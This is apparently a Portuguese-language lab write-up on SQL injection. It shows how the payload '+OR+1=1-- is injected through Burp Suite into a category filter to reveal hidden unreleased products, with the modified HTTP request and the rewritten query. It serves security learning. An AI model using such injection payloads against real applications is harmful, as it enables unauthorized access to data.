##Descrição do Lab
Este laboratório apresenta uma vulnerabilidade de SQL Injection em uma consulta SQL usada para filtrar produtos por categoria. O objetivo é manipular a consulta para exibir produtos não lançados que estão ocultos por padrão.

A consulta original da aplicação é semelhante a:

##sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
Vamos modificar essa consulta para ignorar o filtro AND released = 1, forçando a aplicação a exibir todos os produtos.

##Passos Realizados
#1. Interceptando a Requisição
Acessei o laboratório e cliquei em uma categoria para capturar a requisição enviada ao servidor.
Usei o Burp Suite para interceptar a requisição HTTP. A requisição capturada tinha o seguinte formato:
http
Copiar código
GET /filter?category=Gifts HTTP/1.1
Host: <host_do_lab>
Cookie: session=<session_id>
2. Testando a Vulnerabilidade
Enviei a requisição interceptada para a aba Repeater do Burp Suite para facilitar a manipulação.
Substituí o valor do parâmetro category por uma carga maliciosa:
vbnet
Copiar código
'+OR+1=1--
O que cada parte faz:
': Fecha a string do parâmetro original.
OR 1=1: Adiciona uma condição sempre verdadeira.
--: Ignora o restante da consulta SQL original.
A nova requisição ficou assim:

http
Copiar código
GET /filter?category='+OR+1=1-- HTTP/1.1
Host: <host_do_lab>
Cookie: session=<session_id>
3. Validando os Resultados
Enviei a requisição modificada e obtive como resposta todos os produtos, incluindo os produtos não lançados, confirmando a vulnerabilidade.
Entendendo a Exploração
A consulta SQL original:

sql
Copiar código
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
Foi transformada em:

sql
Copiar código
SELECT * FROM products WHERE category = '' OR 1=1 -- ' AND released = 1
Por que isso funciona:

OR 1=1 força a condição sempre verdadeira, retornando todos os produtos.
-- ignora a parte AND released = 1, removendo o filtro.
Resultados
Antes da Injeção: Apenas produtos lançados da categoria escolhida eram exibidos.
Após a Injeção: Todos os produtos foram exibidos, incluindo os produtos não lançados.
Ferramentas Utilizadas
Burp Suite: Para interceptar e modificar requisições HTTP.
SQL Injection: Técnica para explorar vulnerabilidades em consultas SQL.
Aprendizado
Identificar e explorar vulnerabilidades de SQL Injection.
Manipular consultas SQL para alterar o comportamento de aplicações web.
Uso do Burp Suite como ferramenta essencial em testes de segurança.
Capturas de Tela
Requisição interceptada no Burp Suite

Resultados após a injeção SQL
